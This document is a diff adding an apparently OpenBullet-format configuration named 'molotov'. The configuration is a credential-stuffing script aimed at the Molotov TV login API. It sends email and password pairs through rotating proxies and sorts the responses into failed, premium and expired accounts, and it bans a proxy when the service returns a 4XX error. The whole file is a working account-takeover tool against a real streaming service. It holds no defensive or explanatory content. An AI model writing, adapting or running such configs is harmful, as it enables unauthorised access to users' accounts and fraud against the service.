@@ -1,0 +1,47 @@
+[SETTINGS]
+{
+  "Name": "molotov",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-30T06:53:18.9347989+01:00",
+  "AdditionalInfo": "",
+  "Author": "Me",
+  "Version": "1.1.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 30,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://fapi.molotov.tv/v3.1/auth/login" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"grant_type\":\"password\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
+  HEADER "X-Molotov-Agent: {\"app_build\":1,\"app_id\":\"customer_area\",\"type\":\"desktop\",\"os\":\"windows\",\"manufacturer\":\"\",\"model\":\"\",\"brand\":\"\",\"serial\":\"\"}" 
+  HEADER "X-Molotov-Website: customer_area" 
+  HEADER "Referer: https://www.molotov.tv/account/profile" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,fr;q=0.7" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Vos identifiants sont incorrects" 
+  KEYCHAIN Success OR 
+    KEY "premium\":true" 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "premium\":false" 
+
+KEYCHECK BanOn4XX=TRUE BanOnToCheck=FALSE 
+
